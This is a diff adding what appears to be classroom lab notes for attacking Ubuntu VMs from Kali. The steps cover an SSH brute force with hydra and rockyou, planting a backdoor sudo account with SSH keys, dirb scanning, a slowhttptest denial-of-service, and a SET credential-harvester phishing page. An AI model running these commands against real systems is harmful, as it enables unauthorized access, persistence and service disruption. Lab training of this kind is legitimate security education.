@@ -1,0 +1,145 @@
+
+Attacker 1 (Brute Force + Backdoor Installation):
+
+nmap -sS -sV ip
+hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://ip
+
+ssh username@ip
+
+add a backdoor:
+sudo useradd backdoor -m -s  /bin/bash
+sudo passwd backdoor 
+sudo usermod -aG sudo backdoor
+ssh-keygen -t rsa
+ssh-copy-id backdoor@ip
+
+=======================================================================
+
+Attacker 2 (Web Server Vulnerability Scanning):
+
+Ubuntu VM1
+
+sudo apt update
+sudo apt install nginx
+sudo systemctl start nginx
+sudo systemctl enable nginx
+sudo systemctl status nginx
+sudo nginx -t
+sudo ufw allow 'Nginx HTTP'
+sudo ufw enable
+sudo ufw status
+sudo mkdir /var/www/html/test-site
+sudo nano /var/www/html/test-site/index.html
+sa loob mag create ng html:
+
+<html>
+<head>
+    <title>Test Site</title>
+</head>
+<body>
+    <h1>Welcome to the Test Site</h1>
+    <p>This is a test environment for vulnerability scanning.</p>
+</body>
+</html>
+
+sudo nano /etc/nginx/sites-available/default
+
+Modify the root directive to point to your new directory:
+root /var/www/html/test-site;
+Save and exit (press CTRL+X, then Y and Enter to confirm)
+
+sudo nginx -t
+sudo systemctl restart nginx
+
+
+kali(attacker)
+sudo apt update
+sudo apt install nikto
+sudo apt install dirb
+sudo apt install slowhttptest
+
+slowhttptest -h
+
+
+Run Dirb to discover directories and files:
+Dirb is useful for discovering hidden directories or files on the web server that might not be immediately visible.
+Dirb: Brute-forces directories using a wordlist
+dirb http://<Ubuntu-VM-IP> /usr/share/dirb/wordlists/
+common.txt 
+
+slowhttptest -c 1000 -H -u http://<Ubuntu-VM-IP> -r 200 -l 300
+
+Ubuntu VM1,
+sudo tail -f /var/log/nginx/access.log
+sudo tail -f /var/log/nginx/error.log
+Try accessing using curl
+curl http://<Ubuntu-VM-IP>
+
+=======================================================================================================================================
+
+Attacker 3 (Social Engineering + Remote Access):
+Social Engineering Toolkit
+
+Kali Linux Setup:
+sudo apt update
+sudo apt install traceroute
+sudo apt install set
+
+Ubuntu 24 Setup:
+sudo apt update
+sudo apt install xrdp
+sudo systemctl enable xrdp
+sudo systemctl start xrdp
+sudo ufw allow 3389/tcp
+
+On Kali:
+traceroute <Ubuntu_IP>
+sudo setoolkit
+Select option 1 for Social-Engineering Attacks.
+Then, choose option 2 for "Website Attack Vectors".
+Select "Credential Harvester Attack Method" and proceed.
+Web Templates
+
+ubuntu 24
+curl http://<kali-vm-ip>
+wget http://<kali-vm-ip>
+curl -X POST -d "mark&mark" http://192.168.1.55
+
+kali:
+xfreerdp /u:test /p:1234 /v:<Ubuntu_IP>
+
+
+====================================================================
+Default configuration 
+auto lo
+iface lo inet loopback
+
+or
+
+auto eth0
+iface eth0 inet static 
+   address 192.168.1.50
+   netmask 255.255.255.0
+   gateway 192.168.1.1
+
+sudo systemctl restart networking
+sudo systemctl restart NetworkManager
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
